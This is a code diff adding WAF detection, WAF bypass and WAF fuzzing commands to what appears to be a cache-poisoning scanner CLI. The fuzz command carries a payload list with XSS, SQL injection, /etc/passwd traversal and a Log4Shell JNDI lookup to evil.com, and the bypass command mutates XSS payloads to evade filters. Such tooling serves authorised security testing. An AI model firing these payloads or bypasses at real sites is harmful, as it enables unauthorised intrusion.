@@ -134,7 +134,9 @@ def update():
 @click.option('--skip-unstable/--no-skip-unstable', default=None, help="Skip URLs with unstable baselines (default: skip)")
 @click.option('--rate-limit', type=int, default=None, help="Rate limit in requests per second (0 for no limit).")
 @click.option('--config', help="Path to YAML configuration file.")
-def scan(url, file, request_file, raw, concurrency, header, output, skip_unstable, rate_limit, config):
+@click.option('--no-waf-bypass', is_flag=True, help="Disable automatic WAF bypass.")
+@click.pass_context
+def scan(ctx, url, file, request_file, raw, concurrency, header, output, skip_unstable, rate_limit, config, no_waf_bypass):
     """
     Scan one or more URLs for cache poisoning vulnerabilities.
     """
@@ -152,6 +154,11 @@ def scan(url, file, request_file, raw, concurrency, header, output, skip_unstabl
     # Boolean flag logic: if CLI is None, use config, else use CLI
     if skip_unstable is None:
         skip_unstable = cfg.get('skip_unstable', DEFAULT_CONFIG['skip_unstable'])
+        
+    enable_waf_bypass = cfg.get('enable_waf_bypass', DEFAULT_CONFIG['enable_waf_bypass'])
+    if ctx.params.get('no_waf_bypass'): # Check if flag was explicitly set
+         enable_waf_bypass = False
+
 
     # Merge headers: start with config headers, update with CLI headers
     config_headers = cfg.get('headers', {})
@@ -218,6 +225,8 @@ def scan(url, file, request_file, raw, concurrency, header, output, skip_unstabl
         cache_key_allowlist=cfg.get("cache_key_allowlist", DEFAULT_CONFIG["cache_key_allowlist"]),
         cache_key_ignore_params=cfg.get("cache_key_ignore_params", DEFAULT_CONFIG["cache_key_ignore_params"]),
         enforce_header_allowlist=cfg.get("enforce_header_allowlist", DEFAULT_CONFIG["enforce_header_allowlist"]),
+        enable_waf_bypass=enable_waf_bypass, 
+        waf_max_attempts=cfg.get("waf_max_attempts", DEFAULT_CONFIG["waf_max_attempts"]),
     )
     findings = asyncio.run(engine.run(urls))
     
@@ -345,6 +354,130 @@ def validate(url, header, method, body):
             print("The cache appears to be poisoning clean requests with the malicious response.")
 
     asyncio.run(_run_validation())
+
+    asyncio.run(_run_validation())
+
+@cli.command("waf-detect")
+@click.option('--url', '-u', required=True, help="Target URL to check.")
+def waf_detect(url):
+    """
+    Check if a site is protected by a WAF.
+    """
+    from cpd.logic.waf_bypass import WAFDetector
+    from cpd.http_client import HttpClient
+    
+    async def _run():
+        detector = WAFDetector()
+        async with HttpClient() as client:
+            name, confidence = await detector.detect(client, url)
+            if name:
+                click.secho(f"[+] WAF Detected: {name}", fg="red", bold=True)
+                click.secho(f"[+] Confidence: {confidence}%", fg="yellow")
+            else:
+                click.secho("[-] No WAF detected.", fg="green")
+                
+    asyncio.run(_run())
+
+@cli.command("waf-bypass")
+@click.option('--url', '-u', required=True, help="Target URL.")
+@click.option('--payload', '-p', default="<script>alert(1)</script>", help="Payload to bypass with.")
+@click.option('--header', '-H', help="Header name to inject into (optional).")
+@click.option('--max-attempts', default=50, help="Max bypass attempts.")
+@click.option('--output', '-o', help="Save successful bypasses to JSON.")
+def waf_bypass(url, payload, header, max_attempts, output):
+    """
+    Test WAF bypass techniques.
+    """
+    from cpd.logic.waf_bypass import WAFBypassEngine
+    from cpd.http_client import HttpClient
+    
+    async def _run():
+        engine = WAFBypassEngine()
+        async with HttpClient() as client:
+             # Detect first
+             name, conf = await engine.detector.detect(client, url)
+             if name:
+                 click.secho(f"[+] WAF Detected: {name} ({conf}%)", fg="red")
+             
+             headers_dict = {}
+             if header:
+                  # If header provided, we assume payload goes into that header
+                  headers_dict[header] = payload
+             
+             click.secho(f"[*] Generating bypasses for payload: {payload}", fg="cyan")
+             success, bypasses = await engine.analyze_and_bypass(client, url, payload, headers_dict)
+             
+             if not success or not bypasses:
+                 click.secho("[-] Failed to generate bypasses.", fg="red")
+                 return
+
+             results = []
+             click.secho(f"[*] Testing {min(len(bypasses), max_attempts)} techniques...", fg="cyan")
+             
+             for i, bypass in enumerate(bypasses[:max_attempts]):
+                 is_success = await engine.test_bypass_success(client, url, bypass)
+                 status_symbol = "✓" if is_success else "✗"
+                 color = "green" if is_success else "red"
+                 
+                 click.secho(f"  {status_symbol} [{i+1}/{len(bypasses)}] {bypass['technique']}", fg=color)
+                 
+                 if is_success:
+                     results.append(bypass)
+
+             click.secho("\n============================================================", fg="white")
+             click.secho(f"  Total Tested: {min(len(bypasses), max_attempts)}", fg="white")
+             click.secho(f"  Successful: {len(results)}", fg="green", bold=True)
+             
+             if results and output:
+                 with open(output, 'w') as f:
+                     json.dump(results, f, indent=2)
+                 click.secho(f"[+] Saved {len(results)} successful bypasses to {output}", fg="blue")
+
+    asyncio.run(_run())
+
+@cli.command("waf-fuzz")
+@click.option('--url', '-u', required=True, help="Target URL.")
+@click.option('--wordlist', '-w', type=click.File('r'), help="Custom wordlist file.")
+def waf_fuzz(url, wordlist):
+    """
+    Fuzz WAF with payloads to see what gets blocked.
+    """
+    from cpd.http_client import HttpClient
+    import urllib.parse
+    
+    payloads = [
+        "<script>alert(1)</script>",
+        "' OR '1'='1",
+        "../../etc/passwd",
+        "${jndi:ldap://evil.com}",
+        "javascript:alert(1)"
+    ]
+    
+    if wordlist:
+        payloads = [line.strip() for line in wordlist if line.strip()]
+        
+    async def _run():
+        async with HttpClient() as client:
+            click.secho(f"[*] Fuzzing {len(payloads)} payloads against {url}...", fg="cyan")
+            
+            blocked = 0
+            passed = 0
+            
+            for p in payloads:
+                # Inject in query param for simple fuzzing
+                target = f"{url}?fuzz={urllib.parse.quote(p)}" if '?' not in url else f"{url}&fuzz={urllib.parse.quote(p)}"
+                resp = await client.request("GET", target)
+                
+                if resp and resp['status'] in [403, 406]:
+                    click.secho(f"  [BLOCKED] {p}", fg="red")
+                    blocked += 1
+                else:
+                    click.secho(f"  [PASSED]  {p}", fg="green")
+                    passed += 1
+            
+            click.echo(f"\nStats: Blocked: {blocked}, Passed: {passed}")
+
+    asyncio.run(_run())
 
 if __name__ == "__main__":
     cli()
